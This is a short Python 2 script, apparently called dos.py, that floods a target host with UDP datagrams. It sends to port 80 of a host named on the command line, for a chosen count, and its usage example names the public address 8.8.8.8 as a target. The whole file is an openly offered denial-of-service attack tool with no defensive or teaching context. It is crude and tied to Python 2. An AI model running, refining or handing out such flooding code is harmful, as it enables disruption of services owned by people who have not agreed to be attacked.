import sys
import os
import socket

class Connection:
	def __init__(self, host, thread, buffersize):
			self.host = host
			self.thread = thread
			self.buffersize = buffersize
			self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	def DOS(self):
		for i in range(0, int(self.buffersize)):
			self.s.connect((self.host, 80))
			self.s.send("REQUEST : HTTPS : %s" % self.thread)
			print "Thread #%i successfully Sent to %s" % (i+1, self.host)
		self.s.close()
		print "Attack was successful"

def main():
	if len(sys.argv) != 4:
		print "+================================+"
		print "| This program takes 3 arguments |"
		print "+================================+"
		print "\n"
		print "python dos.py *hostname *thread *# of threads to send"
		print "-----------------------------------------------------"
		print "Ex: python dos.py 8.8.8.8 hello 100"
		print "\n"
	else:
		DDOS = Connection(sys.argv[1], sys.argv[2], sys.argv[3])
		DDOS.DOS()



if __name__ == '__main__':
	main()